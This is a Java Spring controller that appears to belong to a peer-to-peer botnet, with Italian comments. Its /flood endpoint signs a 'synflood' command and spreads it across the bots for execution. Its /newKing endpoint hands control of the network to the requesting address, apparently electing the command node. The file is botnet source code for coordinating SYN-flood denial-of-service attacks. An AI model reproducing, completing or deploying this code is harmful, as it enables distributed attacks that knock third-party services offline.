package cs.sii.controller;

import java.io.UnsupportedEncodingException;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.security.SignatureException;
import java.util.Random;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.servlet.http.HttpServletRequest;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import cs.sii.bot.action.Auth;
import cs.sii.bot.action.Behavior;
import cs.sii.config.onLoad.Config;
import cs.sii.service.connection.NetworkService;
import cs.sii.service.crypto.CryptoPKI;

//Controller del Bot che gestisce le richieste della rete P2P dei Bot 

@Component
@RestController
@RequestMapping("/bot")
public class BotController {

	@Autowired
	Config engineBot;

	@Autowired
	Auth auth;
	
	@Autowired
	CryptoPKI pki;

	@Autowired
	Behavior bhv;

	@Autowired
	NetworkService nServ;

	@RequestMapping("/")
	public String index() {
		return "Bot is Ready";
	}

	@RequestMapping(value="/flood", method = RequestMethod.GET)
	public Boolean msgFlood() {

		// per efficienza chiamo un metodo asincrono e rispondo che ho ricevuto
		// il msg
		// tutto il resto avviene nella in Flood&Execute
		
		String cmd="synflood";
		String msg = "";
		// aggiungi nonce time.millis
		Long milli = System.currentTimeMillis();

		Random rand = new SecureRandom(milli.toString().getBytes());
		Integer nounce = rand.nextInt();

		String hashIdMsg = pki.getCrypto().generateSha256(nounce.toString());

		String signature;
		try {
			signature = pki.signMessageRSA(hashIdMsg);
			msg = hashIdMsg + "|" + cmd + "|" + signature;
		} catch (InvalidKeyException | SignatureException e) {
			e.printStackTrace();
			System.out.println("Non sono riuscito a firmare il messaggio pre Flood");
		}

		
		
		bhv.floodAndExecute(msg);
		return true;
	}

	@RequestMapping("/newKing")
	public Boolean newKing(HttpServletRequest req) {
		if (nServ.isElegible()) {
			
			//TODO scegliere quello giusto
			System.out.println("addr: "+req.getRemoteAddr());
			System.out.println("host: "+req.getRemoteHost());

		bhv.getPower(req.getRemoteAddr());
			return true;
		} else {
			return false;
		}
	}

	@RequestMapping("/ping")
	public Boolean ping() {
		return true;
	}

}
